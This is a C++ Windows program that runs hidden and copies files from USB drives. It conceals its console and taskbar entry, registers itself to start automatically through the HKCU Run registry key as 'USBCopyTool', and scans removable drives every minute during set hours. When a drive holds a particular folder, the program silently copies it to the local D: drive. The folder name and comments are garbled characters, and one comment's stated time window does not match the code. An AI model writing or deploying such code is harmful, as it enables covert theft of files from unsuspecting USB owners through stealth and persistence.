#include <windows.h>
#include <shlwapi.h>
#include <string>
#include <queue>
#include <ctime>

#pragma comment(lib, "shlwapi.lib")

using namespace std;

const wstring TARGET_FOLDER = L"���꼶�ϲ�";
const wstring DEST_PATH = L"D:\\���꼶�ϲ�";

// ����Ƿ���Ŀ¼
bool IsDirectory(const wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

// �ݹ����Ŀ���ļ���
wstring FindTargetFolder(const wstring& rootPath) {
    queue<wstring> directories;
    directories.push(rootPath);

    while (!directories.empty()) {
        wstring currentDir = directories.front();
        directories.pop();

        wstring potentialTarget = currentDir + L"\\" + TARGET_FOLDER;
        if (IsDirectory(potentialTarget)) {
            return potentialTarget;
        }

        WIN32_FIND_DATAW findData;
        wstring searchPath = currentDir + L"\\*";
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (wcscmp(findData.cFileName, L".") != 0 &&
                    wcscmp(findData.cFileName, L"..") != 0 &&
                    (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    directories.push(currentDir + L"\\" + findData.cFileName);
                }
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }
    return L"";
}

// ����Ŀ¼
void CopyDirectorySilent(const wstring& src, const wstring& dst) {
    CreateDirectoryW(dst.c_str(), NULL);

    WIN32_FIND_DATAW findData;
    wstring searchPath = src + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
                continue;
            }

            wstring srcPath = src + L"\\" + findData.cFileName;
            wstring dstPath = dst + L"\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                CopyDirectorySilent(srcPath, dstPath);
            }
            else {
                CopyFileW(srcPath.c_str(), dstPath.c_str(), TRUE);
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
}

// ���USB
void CheckUSB() {
    for (wchar_t c = L'A'; c <= L'Z'; c++) {
        wstring drive = wstring(1, c) + L":\\";
        if (GetDriveTypeW(drive.c_str()) == DRIVE_REMOVABLE) {
            // ����������Ƿ����
            DWORD sectors, bytes, freeClusters, totalClusters;
            if (GetDiskFreeSpaceW(drive.c_str(), &sectors, &bytes, &freeClusters, &totalClusters)) {
                wstring foundPath = FindTargetFolder(drive);
                if (!foundPath.empty()) {
                    CopyDirectorySilent(foundPath, DEST_PATH);
                    break;
                }
            }
        }
    }
}

// ���ÿ���������
void SetAutoStart() {
    HKEY hKey;
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);

    // ��ӵ�ע���������
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExW(hKey, L"USBCopyTool", 0, REG_SZ, (BYTE*)szPath, (wcslen(szPath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
}

// ��鵱ǰʱ���Ƿ���8:00��11:45֮��
bool IsWithinTimeRange() {
    SYSTEMTIME st;
    GetLocalTime(&st);

    // ���Сʱ�ͷ���
    if (st.wHour < 8) return false;
    if (st.wHour > 17) return false;
    if (st.wHour == 17 && st.wMinute > 10) return false;

    return true;
}

// ������
int main() {
    // ���ؿ���̨����
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);

    // ���ô�����ʽΪ���ߴ��ڣ�ʹ�䲻����������ʾ
    SetWindowLongPtr(console, GWL_EXSTYLE, GetWindowLongPtr(console, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);

    // ���ÿ���������
    SetAutoStart();

    // ��ѭ��
    while (true) {
        // ֻ��8:00��11:45֮����
        if (IsWithinTimeRange()) {
            CheckUSB();
        }

        // ÿ60����һ��
        Sleep(60000);
    }

    return 0;
}